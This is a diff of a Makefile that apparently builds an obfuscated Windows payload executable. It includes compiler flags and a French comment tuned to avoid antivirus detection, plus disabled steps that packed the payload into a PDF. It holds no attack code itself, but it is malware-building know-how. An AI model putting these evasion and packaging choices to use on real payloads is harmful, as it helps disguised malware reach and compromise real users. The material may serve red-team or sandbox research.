@@ -1,5 +1,6 @@
 CC = x86_64-w64-mingw32-gcc
-CFLAGS = -Ibuild -Wall -Wextra -O1 -mwindows -ffunction-sections -fdata-sections -fno-asynchronous-unwind-tables -fno-unwind-tables -fno-exceptions -fno-stack-protector -fno-stack-check -fno-strict-aliasing
+# -nostdlib diminue drastiquement la taille à quelques Ko mais rend la détection beaucoup plus facile
+CFLAGS = -Ibuild -Wall -Wextra -Os -O2 -mwindows -ffunction-sections -fdata-sections -fno-asynchronous-unwind-tables -fno-unwind-tables -fno-exceptions -fno-stack-protector -fno-stack-check -fno-strict-aliasing -ffreestanding
 WARNNIGS = -Wno-cast-function-type -Wno-unused-parameter -Wno-unused-variable -Wattributes
 LIBS = -lmingw32 -lkernel32 -lntdll -luser32 -ladvapi32 -lshell32 -lwininet -lm -lgcc 
 OBFUSCATION = -s -fvisibility=hidden -fno-inline -fno-builtin -fno-ident
@@ -18,6 +19,7 @@ all: pre-build $(OUTPUT_FILE) post-build
 pre-build:
 	@mkdir -p bin build
 	@cp src/* build/
+	@cp asm/* build/
 	@python3 main.py
 	# @rm build/payload.txt
 
@@ -26,8 +28,8 @@ $(OUTPUT_FILE): $(SRC) $(HEADERS)
 
 post-build:
 	cp bin/$(OUTPUT_FILE) ../../sandbox/
-	cp bin/$(OUTPUT_FILE) pdf/payload.exe
-	@./pdf/create.sh
+	# cp bin/$(OUTPUT_FILE) pdf/payload.exe
+	# @./pdf/create.sh
 
 clean:
 	rm -rf bin build
